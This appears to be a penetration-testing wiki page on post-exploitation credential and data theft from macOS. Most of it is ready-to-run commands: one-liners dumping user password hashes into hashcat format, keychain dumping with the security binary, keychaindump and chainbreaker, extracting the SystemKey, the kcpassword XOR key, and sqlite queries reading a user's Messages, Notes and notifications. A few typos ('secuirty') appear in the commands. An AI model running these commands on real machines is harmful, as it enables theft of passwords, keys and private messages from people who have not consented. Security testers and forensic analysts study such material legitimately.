## Passwords

### Shadow Passwords

Shadow password is stored with the user's configuration in plists located in **`/var/db/dslocal/nodes/Default/users/`**.\
The following oneliner can be use to dump **all the information about the users** (including hash info):

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**Scripts like this one**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) or [**this one**](https://github.com/octomagon/davegrohl.git) can be used to transform the hash to **hashcat** **format**.

An alternative one-liner which will dump creds of all non-service accounts in hashcat format `-m 7100` (macOS PBKDF2-SHA512):

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### Keychain Dump

Note that when using the security binary to **dump the passwords decrypted**, several prompts will ask the user to allow this operation.

```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```

### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
Based on this comment [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) it looks like these tools aren't working anymore in Big Sur.
{% endhint %}

### Keychaindump Overview

A tool named **keychaindump** has been developed to extract passwords from macOS keychains, but it faces limitations on newer macOS versions like Big Sur, as indicated in a [discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). The use of **keychaindump** requires the attacker to gain access and escalate privileges to **root**. The tool exploits the fact that the keychain is unlocked by default upon user login for convenience, allowing applications to access it without requiring the user's password repeatedly. However, if a user opts to lock their keychain after each use, **keychaindump** becomes ineffective.

**Keychaindump** operates by targeting a specific process called **securityd**, described by Apple as a daemon for authorization and cryptographic operations, crucial for accessing the keychain. The extraction process involves identifying a **Master Key** derived from the user's login password. This key is essential for reading the keychain file. To locate the **Master Key**, **keychaindump** scans the memory heap of **securityd** using the `vmmap` command, looking for potential keys within areas flagged as `MALLOC_TINY`. The following command is used to inspect these memory locations:

```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```

After identifying potential master keys, **keychaindump** searches through the heaps for a specific pattern (`0x0000000000000018`) that indicates a candidate for the master key. Further steps, including deobfuscation, are required to utilize this key, as outlined in **keychaindump**'s source code. Analysts focusing on this area should note that the crucial data for decrypting the keychain is stored within the memory of the **securityd** process. An example command to run **keychaindump** is:

```bash
sudo ./keychaindump
```


### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) can be used to extract the following types of information from an OSX keychain in a forensically sound manner:

* Hashed Keychain password, suitable for cracking with [hashcat](https://hashcat.net/hashcat/) or [John the Ripper](https://www.openwall.com/john/)
* Internet Passwords
* Generic Passwords
* Private Keys
* Public Keys
* X509 Certificates
* Secure Notes
* Appleshare Passwords

Given the keychain unlock password, a master key obtained using [volafox](https://github.com/n0fate/volafox) or [volatility](https://github.com/volatilityfoundation/volatility), or an unlock file such as SystemKey, Chainbreaker will also provide plaintext passwords.

Without one of these methods of unlocking the Keychain, Chainbreaker will display all other available information.

#### **Dump keychain keys**

```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```

#### **Dump keychain keys (with passwords) with SystemKey**

```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Dump keychain keys (with passwords) cracking the hash**

```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Dump keychain keys (with passwords) with memory dump**

[Follow these steps](..#dumping-memory-with-osxpmem) to perform a **memory dump**

```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Dump keychain keys (with passwords) using users password**

If you know the users password you can use it to **dump and decrypt keychains that belong to the user**.

```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```

### kcpassword

The **kcpassword** file is a file that holds the **user‚Äôs login password**, but only if the system owner has **enabled automatic login**. Therefore, the user will be automatically logged in without being asked for a password (which isn't very secure).

The password is stored in the file **`/etc/kcpassword`** xored with the key **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. If the users password is longer than the key, the key will be reused.\
This makes the password pretty easy to recover, for example using scripts like [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Interesting Information in Databases

### Messages

```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```

### Notifications

You can find the Notifications data in `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

Most of the interesting information is going to be in **blob**. So you will need to **extract** that content and **transform** it to **human** **readable** or use **`strings`**. To access it you can do:

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
{% endcode %}

### Notes

The users **notes** can be found in `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`

{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}
